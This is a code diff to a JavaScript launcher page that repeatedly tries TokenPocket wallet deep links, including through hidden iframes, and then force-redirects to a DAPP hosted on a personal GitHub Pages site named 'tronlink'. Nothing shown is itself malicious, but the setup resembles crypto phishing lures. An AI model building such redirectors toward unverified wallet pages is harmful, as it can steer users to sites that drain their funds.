@@ -61,64 +61,85 @@
     // 目标DAPP地址
     const DAPP_URL = 'https://amylee850608.github.io/tronlink/';
     
+    // 检测是否在Token Pocket中打开
+    function isInTokenPocket() {
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      return /TokenPocket/i.test(ua) || window.tp || window.tokenpocket;
+    }
+    
     // Token Pocket URL scheme - 尝试多种格式
     const encodedUrl = encodeURIComponent(DAPP_URL);
-    // 格式1: 使用url参数
-    const TP_SCHEME_1 = `tpdapp://open?url=${encodedUrl}`;
-    // 格式2: 使用dappUrl参数
-    const TP_SCHEME_2 = `tpdapp://open?dappUrl=${encodedUrl}`;
-    // 格式3: 使用dapp参数
-    const TP_SCHEME_3 = `tpdapp://dapp?url=${encodedUrl}`;
     
     // 尝试打开Token Pocket并加载DAPP
     function openTokenPocket() {
-      console.log('开始尝试打开Token Pocket，DAPP地址:', DAPP_URL);
-      
-      // 方法1: 尝试格式1 (url参数)
-      console.log('尝试格式1:', TP_SCHEME_1);
-      try {
-        window.location.href = TP_SCHEME_1;
-      } catch(e) {
-        console.log('格式1失败:', e);
+      // 如果已经在Token Pocket中，直接显示提示并跳转
+      if (isInTokenPocket()) {
+        console.log('已经在Token Pocket中，跳转到DAPP');
+        window.location.href = DAPP_URL;
+        return;
       }
       
-      // 方法2: 同时尝试iframe方式（某些浏览器需要）
-      setTimeout(() => {
-        try {
-          const iframe = document.createElement('iframe');
-          iframe.style.display = 'none';
-          iframe.src = TP_SCHEME_2; // 尝试格式2 (dappUrl参数)
-          document.body.appendChild(iframe);
-          console.log('尝试格式2 (iframe):', TP_SCHEME_2);
+      // 尝试多种URL scheme格式
+      const schemes = [
+        `tpdapp://open?dappUrl=${encodedUrl}`,
+        `tpdapp://open?url=${encodedUrl}`,
+        `tpdapp://open?dappUrl=${DAPP_URL}`,
+        `tpdapp://${DAPP_URL.replace(/^https?:\/\//, '')}`
+      ];
+      
+      let tried = 0;
+      
+      function tryScheme(index) {
+        if (index >= schemes.length) {
+          // 所有格式都失败，显示提示并跳转到DAPP页面
+          document.querySelector('.loading').textContent = '请在Token Pocket钱包中打开下方链接';
+          document.getElementById('openLink').href = DAPP_URL;
+          document.getElementById('openLink').textContent = '打开DAPP页面';
           setTimeout(() => {
-            if (iframe.parentNode) {
-              iframe.parentNode.removeChild(iframe);
-            }
-          }, 1000);
-        } catch(e) {
-          console.log('格式2失败:', e);
+            window.location.href = DAPP_URL;
+          }, 2000);
+          return;
         }
-      }, 200);
-      
-      // 方法3: 如果前两个都失败，尝试格式3
-      setTimeout(() => {
-        if (document.hasFocus() || document.visibilityState === 'visible') {
-          console.log('尝试格式3:', TP_SCHEME_3);
+        
+        const scheme = schemes[index];
+        console.log(`尝试格式${index + 1}:`, scheme);
+        
+        // 使用window.location尝试
+        window.location.href = scheme;
+        
+        // 同时使用iframe方式
+        setTimeout(() => {
           try {
-            window.location.href = TP_SCHEME_3;
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = scheme;
+            document.body.appendChild(iframe);
+            setTimeout(() => {
+              if (iframe.parentNode) {
+                iframe.parentNode.removeChild(iframe);
+              }
+            }, 1000);
           } catch(e) {
-            console.log('格式3失败:', e);
+            console.log('iframe方式失败');
           }
-        }
-      }, 500);
+        }, 100);
+        
+        // 如果1秒后还在当前页面，尝试下一个格式
+        setTimeout(() => {
+          if (document.hasFocus() || document.visibilityState === 'visible') {
+            tried++;
+            if (tried >= schemes.length) {
+              // 所有格式都失败
+              tryScheme(schemes.length);
+            } else {
+              tryScheme(index + 1);
+            }
+          }
+        }, 1000);
+      }
       
-      // 方法4: 如果所有URL scheme都失败，1.5秒后直接跳转到DAPP页面
-      setTimeout(() => {
-        if (document.hasFocus() || document.visibilityState === 'visible') {
-          console.log('所有URL scheme失败，跳转到DAPP页面');
-          window.location.href = DAPP_URL;
-        }
-      }, 2000);
+      // 开始尝试
+      tryScheme(0);
     }
     
     // 设置点击事件
